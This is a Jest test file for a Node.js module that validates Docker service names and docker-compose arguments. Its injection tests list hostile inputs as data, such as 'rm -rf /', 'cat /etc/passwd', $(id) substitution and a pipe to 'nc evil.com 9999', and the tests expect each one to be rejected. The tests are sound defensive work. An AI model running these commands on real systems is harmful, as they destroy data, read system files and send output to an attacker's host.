/**
 * Tests for services.js security hardening
 * Run with: npm test -- services.security.test.js
 */

const {
  SERVICES,
  VALID_SERVICE_NAMES,
  MAX_HTTP_TIMEOUT,
  MAX_PS_LINES,
  MAX_OUTPUT_BUFFER_SIZE,
  COMPOSE_TIMEOUT_MS,
  COMPOSE_MAX_BUFFER_SIZE,
  validateServiceName,
  validateServiceNames,
  checkService,
  runDockerCompose,
  findInfraDir,
  DockerSecurityError,
  DockerCommandError,
} = require('../lib/services');

// =============================================================================
// Service Name Validation Tests
// =============================================================================

describe('validateServiceName', () => {
  test('accepts valid service names', () => {
    const validNames = ['interface', 'backend', 'core', 'gateway'];

    for (const name of validNames) {
      expect(() => validateServiceName(name)).not.toThrow();
      expect(validateServiceName(name)).toBe(true);
    }
  });

  test('rejects non-string inputs', () => {
    expect(() => validateServiceName(null)).toThrow(DockerSecurityError);
    expect(() => validateServiceName(undefined)).toThrow(DockerSecurityError);
    expect(() => validateServiceName(123)).toThrow(DockerSecurityError);
    expect(() => validateServiceName({})).toThrow(DockerSecurityError);
    expect(() => validateServiceName([])).toThrow(DockerSecurityError);
    expect(() => validateServiceName(true)).toThrow(DockerSecurityError);
  });

  test('rejects unknown service names', () => {
    expect(() => validateServiceName('unknown')).toThrow(DockerSecurityError);
    expect(() => validateServiceName('evil')).toThrow(DockerSecurityError);
    expect(() => validateServiceName('')).toThrow(DockerSecurityError);
    expect(() => validateServiceName('interface;rm -rf /')).toThrow(DockerSecurityError);
  });

  test('error includes correct code for type errors', () => {
    try {
      validateServiceName(null);
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.code).toBe('INVALID_SERVICE_NAME_TYPE');
      expect(err.isSecurityError).toBe(true);
    }
  });

  test('error includes correct code for unknown services', () => {
    try {
      validateServiceName('hacker');
    } catch (err) {
      expect(err.code).toBe('UNKNOWN_SERVICE');
      expect(err.details.validServices).toContain('interface');
      expect(err.details.validServices).toContain('backend');
    }
  });

  test('error includes provided type info for non-strings', () => {
    try {
      validateServiceName(123);
    } catch (err) {
      expect(err.details.provided).toBe('number');
    }
  });
});

// =============================================================================
// Service Names Array Validation Tests
// =============================================================================

describe('validateServiceNames', () => {
  test('accepts array of valid service names', () => {
    expect(() => validateServiceNames(['interface', 'backend'])).not.toThrow();
    expect(validateServiceNames(['core', 'gateway'])).toBe(true);
    expect(validateServiceNames([])).toBe(true); // Empty array is valid
  });

  test('accepts single-item array', () => {
    expect(() => validateServiceNames(['interface'])).not.toThrow();
  });

  test('rejects non-array inputs', () => {
    expect(() => validateServiceNames('interface')).toThrow(DockerSecurityError);
    expect(() => validateServiceNames(null)).toThrow(DockerSecurityError);
    expect(() => validateServiceNames(undefined)).toThrow(DockerSecurityError);
    expect(() => validateServiceNames(123)).toThrow(DockerSecurityError);
    expect(() => validateServiceNames({})).toThrow(DockerSecurityError);
  });

  test('rejects array with invalid service names', () => {
    expect(() => validateServiceNames(['interface', 'evil'])).toThrow(DockerSecurityError);
    expect(() => validateServiceNames(['hacker', 'backend'])).toThrow(DockerSecurityError);
  });

  test('rejects array with non-string elements', () => {
    expect(() => validateServiceNames(['interface', 123])).toThrow(DockerSecurityError);
    expect(() => validateServiceNames([null, 'backend'])).toThrow(DockerSecurityError);
  });

  test('error code for non-array input', () => {
    try {
      validateServiceNames('interface');
    } catch (err) {
      expect(err.code).toBe('INVALID_SERVICE_NAMES_TYPE');
    }
  });
});

// =============================================================================
// Service Configuration Tests
// =============================================================================

describe('Service Configuration Constants', () => {
  test('SERVICES contains expected services', () => {
    expect(SERVICES).toHaveProperty('interface');
    expect(SERVICES).toHaveProperty('backend');
    expect(SERVICES).toHaveProperty('core');
    expect(SERVICES).toHaveProperty('gateway');
  });

  test('each service has required properties', () => {
    for (const [key, config] of Object.entries(SERVICES)) {
      expect(config).toHaveProperty('port');
      expect(config).toHaveProperty('name');
      expect(config).toHaveProperty('url');
      expect(typeof config.port).toBe('number');
      expect(typeof config.name).toBe('string');
      expect(typeof config.url).toBe('string');
    }
  });

  test('VALID_SERVICE_NAMES matches SERVICES keys', () => {
    const keys = Object.keys(SERVICES);
    expect(VALID_SERVICE_NAMES.size).toBe(keys.length);
    for (const key of keys) {
      expect(VALID_SERVICE_NAMES.has(key)).toBe(true);
    }
  });

  test('MAX_HTTP_TIMEOUT is reasonable', () => {
    expect(MAX_HTTP_TIMEOUT).toBeGreaterThan(0);
    expect(MAX_HTTP_TIMEOUT).toBeLessThanOrEqual(30000); // Max 30 seconds
  });
});

// =============================================================================
// checkService Security Tests
// =============================================================================

describe('checkService security', () => {
  test('returns error status for invalid service name type', async () => {
    const result = await checkService(null, { port: 3000, url: 'http://localhost:3000', name: 'Test' });
    expect(result.status).toBe('error');
    expect(result.error).toContain('string');
  });

  test('returns error status for unknown service', async () => {
    const result = await checkService('evil-service', { port: 3000, url: 'http://localhost:3000', name: 'Test' });
    expect(result.status).toBe('error');
    expect(result.error).toContain('Unknown service');
  });

  test('handles injection attempt in service name gracefully', async () => {
    const maliciousNames = [
      'interface; rm -rf /',
      'backend && cat /etc/passwd',
      '../../../etc/passwd',
      'core`whoami`',
      'gateway$(id)',
    ];

    for (const name of maliciousNames) {
      const result = await checkService(name, { port: 3000, url: 'http://localhost:3000', name: 'Test' });
      expect(result.status).toBe('error');
      expect(result.error).toContain('Unknown service');
    }
  });
});

// =============================================================================
// runDockerCompose Security Tests
// =============================================================================

describe('runDockerCompose security', () => {
  test('rejects non-array arguments', async () => {
    await expect(runDockerCompose('up')).rejects.toThrow(DockerSecurityError);
    await expect(runDockerCompose(null)).rejects.toThrow(DockerSecurityError);
    await expect(runDockerCompose(123)).rejects.toThrow(DockerSecurityError);
  });

  test('rejects disallowed commands', async () => {
    await expect(runDockerCompose(['exec', 'bash'])).rejects.toThrow(DockerSecurityError);
    await expect(runDockerCompose(['run', 'evil'])).rejects.toThrow(DockerSecurityError);
    await expect(runDockerCompose(['rm', '-rf', '/'])).rejects.toThrow(DockerSecurityError);
  });

  test('rejects command injection attempts', async () => {
    const attacks = [
      ['up', ';', 'rm', '-rf', '/'],
      ['up', '&&', 'cat', '/etc/passwd'],
      ['up', '|', 'nc', 'evil.com', '9999'],
      ['up', '`whoami`'],
      ['up', '$(id)'],
    ];

    for (const args of attacks) {
      await expect(runDockerCompose(args)).rejects.toThrow(DockerSecurityError);
    }
  });

  test('rejects path traversal in working directory', async () => {
    await expect(runDockerCompose(['ps'], '../../../etc')).rejects.toThrow(DockerSecurityError);
    await expect(runDockerCompose(['ps'], '..\windows\system32')).rejects.toThrow(DockerSecurityError);
  });

  test('accepts valid arguments', async () => {
    // These should pass validation (but may fail on execution)
    const validCalls = [
      runDockerCompose(['ps']).catch(e => expect(e).not.toBeInstanceOf(DockerSecurityError)),
      runDockerCompose(['up', '-d'], '/tmp').catch(e => expect(e).not.toBeInstanceOf(DockerSecurityError)),
    ];

    await Promise.all(validCalls);
  });

  test('accepts custom timeout option', async () => {
    // Should pass validation with custom timeout (will fail on execution since docker-compose may not exist)
    await expect(runDockerCompose(['ps'], '/tmp', { timeout: 1000 }))
      .rejects.not.toBeInstanceOf(DockerSecurityError);
  });
});

// =============================================================================
// runDockerCompose Timeout and Buffer Tests
// =============================================================================

describe('runDockerCompose timeout and buffer protection', () => {
  test('exports COMPOSE_TIMEOUT_MS constant', () => {
    expect(COMPOSE_TIMEOUT_MS).toBeDefined();
    expect(typeof COMPOSE_TIMEOUT_MS).toBe('number');
    expect(COMPOSE_TIMEOUT_MS).toBe(5 * 60 * 1000); // 5 minutes default
  });

  test('exports COMPOSE_MAX_BUFFER_SIZE constant', () => {
    expect(COMPOSE_MAX_BUFFER_SIZE).toBeDefined();
    expect(typeof COMPOSE_MAX_BUFFER_SIZE).toBe('number');
    expect(COMPOSE_MAX_BUFFER_SIZE).toBe(10 * 1024 * 1024); // 10MB default
  });

  test('accepts valid timeout options', async () => {
    // Should accept valid timeout values without security errors
    const validTimeouts = [1000, 5000, 30000, 60000, 300000];

    for (const timeout of validTimeouts) {
      // Will fail on execution but not on validation
      await expect(runDockerCompose(['ps'], '/tmp', { timeout }))
        .rejects.not.toBeInstanceOf(DockerSecurityError);
    }
  });
});

// =============================================================================
// findInfraDir Security Tests
// =============================================================================

describe('findInfraDir security', () => {
  test('returns null or string', async () => {
    const result = await findInfraDir();
    expect(result === null || typeof result === 'string').toBe(true);
  });

  test('validates paths before use', async () => {
    // This test verifies the function doesn't throw when checking paths
    // The actual return value depends on the filesystem
    await expect(findInfraDir()).resolves.not.toThrow();
  });
});

// =============================================================================
// Integration Security Tests
// =============================================================================

describe('Security Integration Tests', () => {
  test('all exported validation functions have proper error codes', () => {
    const tests = [
      { fn: () => validateServiceName(null), code: 'INVALID_SERVICE_NAME_TYPE' },
      { fn: () => validateServiceName('unknown'), code: 'UNKNOWN_SERVICE' },
      { fn: () => validateServiceNames('interface'), code: 'INVALID_SERVICE_NAMES_TYPE' },
      { fn: () => validateServiceNames(['interface', 'evil']), code: 'UNKNOWN_SERVICE' },
    ];

    for (const test of tests) {
      try {
        test.fn();
        fail(`Expected ${test.code} to be thrown`);
      } catch (err) {
        expect(err.code).toBe(test.code);
      }
    }
  });

  test('DockerSecurityError is properly imported and used', () => {
    // Verify we can catch DockerSecurityError from the docker module
    try {
      validateServiceName('evil');
      fail('Expected error');
    } catch (err) {
      expect(err).toBeInstanceOf(DockerSecurityError);
      expect(err.isSecurityError).toBe(true);
    }
  });
});

// Export for Jest
module.exports = {
  DockerSecurityError,
  DockerCommandError,
};

// =============================================================================
// Security Constants Tests
// =============================================================================

describe('Security Constants', () => {
  test('MAX_PS_LINES is defined with reasonable value', () => {
    expect(MAX_PS_LINES).toBeDefined();
    expect(MAX_PS_LINES).toBe(1000);
    expect(MAX_PS_LINES).toBeGreaterThan(0);
    expect(MAX_PS_LINES).toBeLessThanOrEqual(10000);
  });

  test('MAX_OUTPUT_BUFFER_SIZE is defined with reasonable value', () => {
    expect(MAX_OUTPUT_BUFFER_SIZE).toBeDefined();
    expect(MAX_OUTPUT_BUFFER_SIZE).toBe(10 * 1024 * 1024); // 10MB
    expect(MAX_OUTPUT_BUFFER_SIZE).toBeGreaterThan(1024 * 1024); // At least 1MB
  });

  test('MAX_HTTP_TIMEOUT is reasonable', () => {
    expect(MAX_HTTP_TIMEOUT).toBeDefined();
    expect(MAX_HTTP_TIMEOUT).toBe(10000); // 10 seconds
    expect(MAX_HTTP_TIMEOUT).toBeGreaterThan(0);
    expect(MAX_HTTP_TIMEOUT).toBeLessThanOrEqual(60000); // Max 60 seconds
  });

  test('COMPOSE_TIMEOUT_MS is defined with reasonable value', () => {
    expect(COMPOSE_TIMEOUT_MS).toBeDefined();
    expect(COMPOSE_TIMEOUT_MS).toBe(5 * 60 * 1000); // 5 minutes
    expect(COMPOSE_TIMEOUT_MS).toBeGreaterThan(60000); // At least 1 minute
    expect(COMPOSE_TIMEOUT_MS).toBeLessThanOrEqual(10 * 60 * 1000); // Max 10 minutes
  });

  test('COMPOSE_MAX_BUFFER_SIZE is defined with reasonable value', () => {
    expect(COMPOSE_MAX_BUFFER_SIZE).toBeDefined();
    expect(COMPOSE_MAX_BUFFER_SIZE).toBe(10 * 1024 * 1024); // 10MB
    expect(COMPOSE_MAX_BUFFER_SIZE).toBeGreaterThan(1024 * 1024); // At least 1MB
    expect(COMPOSE_MAX_BUFFER_SIZE).toBeLessThanOrEqual(100 * 1024 * 1024); // Max 100MB
  });
});

// =============================================================================
// Error Class Exports Tests
// =============================================================================

describe('Error Class Exports', () => {
  test('DockerSecurityError is properly exported from services', () => {
    expect(DockerSecurityError).toBeDefined();
    const err = new DockerSecurityError('Test', 'TEST_CODE');
    expect(err).toBeInstanceOf(Error);
    expect(err.isSecurityError).toBe(true);
    expect(err.code).toBe('TEST_CODE');
  });

  test('DockerCommandError is properly exported from services', () => {
    expect(DockerCommandError).toBeDefined();
    const err = new DockerCommandError('Test', 'CODE', 1, 'stdout', 'stderr');
    expect(err).toBeInstanceOf(Error);
    expect(err.exitCode).toBe(1);
    expect(err.stdout).toBe('stdout');
    expect(err.stderr).toBe('stderr');
  });
});
